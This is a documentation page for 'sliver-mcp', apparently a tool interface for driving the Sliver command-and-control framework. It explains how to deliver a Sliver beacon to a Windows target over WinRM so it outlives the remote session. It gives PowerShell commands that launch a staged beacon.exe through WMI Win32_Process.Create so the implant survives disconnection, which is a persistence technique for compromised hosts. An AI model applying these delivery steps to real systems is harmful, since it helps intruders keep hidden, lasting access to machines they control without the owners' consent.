# Beacon delivery & detachment

`sliver-mcp` builds the implant/beacon (`generate_beacon`, `generate_implant`,
`regenerate_or_build`); **delivery** — getting it running on the target so it
survives the delivery channel closing — is the operator's job.

The trap on both platforms is the same: a beacon launched as a child of your
remote-access session is tied to that session's lifetime and is killed when the
session closes, often after only a single check-in. Detach it from the session.

## Windows — WinRM delivery

`Start-Process` inside a WinRM (PowerShell Remoting) session attaches the spawned
process to the **WinRM session's Windows job object**. When the WinRM connection
closes, that job object is torn down and the beacon is killed with it — the
symptom is one check-in, then the beacon goes dark right after you disconnect.

Detach with WMI `Win32_Process.Create`, which spawns a session-0 process fully
decoupled from the WinRM job object:

```powershell
# tied to the WinRM job object, killed on disconnect:
Start-Process C:\Windows\Temp\beacon.exe

# decoupled session-0 process that survives WinRM disconnect:
([wmiclass]"Win32_Process").Create("C:\Windows\Temp\beacon.exe")
```

`Win32_Process.Create` is the canonical Windows-over-WinRM delivery method for a
Sliver beacon built by this MCP. Deliver the file first (`upload`, or stage it
on a share), then create the process via WMI.
